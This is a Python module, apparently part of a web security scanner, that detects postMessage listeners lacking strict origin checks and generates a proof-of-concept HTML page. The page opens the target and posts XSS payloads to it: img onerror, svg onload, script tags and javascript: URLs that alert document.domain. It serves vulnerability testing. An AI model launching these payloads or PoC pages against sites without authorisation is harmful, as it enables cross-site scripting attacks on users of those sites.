"""postMessage XSS — missing/weak origin validation on message listeners."""

from __future__ import annotations

import re
from dataclasses import dataclass, field

import httpx


# Patterns indicating unsafe postMessage handlers in JS source
_UNSAFE_PATTERNS = [
    re.compile(r'addEventListener\s*\(\s*["\']message["\']', re.I),
    re.compile(r'on\s*message\s*=', re.I),
    re.compile(r'\.origin\s*==\s*', re.I),          # == instead of ===
    re.compile(r'\.origin\s*!==?\s*["\']["\']', re.I),  # compares to empty string
    re.compile(r'e\.data\b|event\.data\b', re.I),
    re.compile(r'eval\s*\(', re.I),
    re.compile(r'innerHTML\s*=', re.I),
    re.compile(r'document\.write\s*\(', re.I),
    re.compile(r'location\s*=\s*event\.data', re.I),
]

# No origin check patterns
_NO_ORIGIN_CHECK = re.compile(
    r'addEventListener\s*\(\s*["\']message["\']\s*,\s*function[^}]{0,500}?\)',
    re.I | re.S,
)

# postMessage XSS probe payloads (sent from an attacker page via postMessage)
POSTMESSAGE_PAYLOADS = [
    "<img src=x onerror=alert(document.domain)>",
    "<svg onload=alert(document.domain)>",
    "<script>alert(document.domain)</script>",
    "javascript:alert(document.domain)",
    {"type": "navigate", "url": "javascript:alert(document.domain)"},
    {"html": "<img src=x onerror=alert(document.domain)>"},
    {"redirect": "javascript:alert(document.domain)"},
]

# HTML page that sends postMessage to the target window (PoC generator)
POC_TEMPLATE = """\
<!DOCTYPE html>
<html>
<head><title>postMessage XSS PoC</title></head>
<body>
<script>
  var target = window.open('{target_url}', 'target');
  setTimeout(function() {{
    target.postMessage({payload}, '*');
  }}, 1500);
</script>
<p>Opening target and sending postMessage...</p>
</body>
</html>
"""


@dataclass
class PostMessageHandler:
    """A message event listener extracted from page JS."""
    origin_check: bool
    origin_check_strict: bool   # uses === not ==
    sinks: list[str]
    snippet: str


@dataclass
class PostMessageFinding:
    type: str = "postmessage_xss"
    url: str = ""
    handler_snippet: str = ""
    missing_origin_check: bool = False
    weak_origin_check: bool = False
    dangerous_sinks: list[str] = field(default_factory=list)
    poc_payloads: list[str] = field(default_factory=list)
    poc_html: str = ""
    severity: str = "P1"


class PostMessageBypass:
    """Analyses JS for unsafe postMessage handlers and generates PoC."""

    def __init__(self, session: httpx.Client | None = None):
        self.session = session or httpx.Client(timeout=20, follow_redirects=True)

    def scan(self, url: str) -> list[PostMessageFinding]:
        try:
            resp = self.session.get(url)
        except Exception:
            return []
        js_sources = self._collect_js(url, resp.text)
        findings: list[PostMessageFinding] = []
        for js in js_sources:
            handlers = self._parse_handlers(js)
            for handler in handlers:
                if not handler.origin_check or not handler.origin_check_strict:
                    poc_payloads = [
                        p if isinstance(p, str) else str(p)
                        for p in POSTMESSAGE_PAYLOADS[:4]
                    ]
                    poc_html = POC_TEMPLATE.format(
                        target_url=url,
                        payload=repr(poc_payloads[0]),
                    )
                    findings.append(PostMessageFinding(
                        url=url,
                        handler_snippet=handler.snippet,
                        missing_origin_check=not handler.origin_check,
                        weak_origin_check=handler.origin_check and not handler.origin_check_strict,
                        dangerous_sinks=handler.sinks,
                        poc_payloads=poc_payloads,
                        poc_html=poc_html,
                    ))
        return findings

    def _parse_handlers(self, js: str) -> list[PostMessageHandler]:
        handlers = []
        for m in re.finditer(
            r'addEventListener\s*\(\s*["\']message["\'].*?(?=addEventListener|$)',
            js, re.S | re.I,
        ):
            block = m.group(0)[:600]
            has_origin = bool(re.search(r'\.origin', block, re.I))
            strict = bool(re.search(r'\.origin\s*===', block, re.I))
            sinks = []
            for pat_name, pat in [
                ("eval", re.compile(r'\beval\s*\(')),
                ("innerHTML", re.compile(r'innerHTML\s*=')),
                ("document.write", re.compile(r'document\.write\s*\(')),
                ("location", re.compile(r'\blocation\s*=')),
            ]:
                if pat.search(block):
                    sinks.append(pat_name)
            handlers.append(PostMessageHandler(
                origin_check=has_origin, origin_check_strict=strict,
                sinks=sinks, snippet=block[:200],
            ))
        return handlers

    def _collect_js(self, base_url: str, html: str) -> list[str]:
        js_blobs = [m.group(1) for m in re.finditer(r'<script[^>]*>(.*?)</script>', html, re.S | re.I)]
        src_urls = re.findall(r'<script[^>]+src=["\']([^"\']+)', html, re.I)
        for src in src_urls[:5]:
            full = src if src.startswith("http") else base_url.rstrip("/") + "/" + src.lstrip("/")
            try:
                js_blobs.append(self.session.get(full, timeout=10).text)
            except Exception:
                pass
        return js_blobs
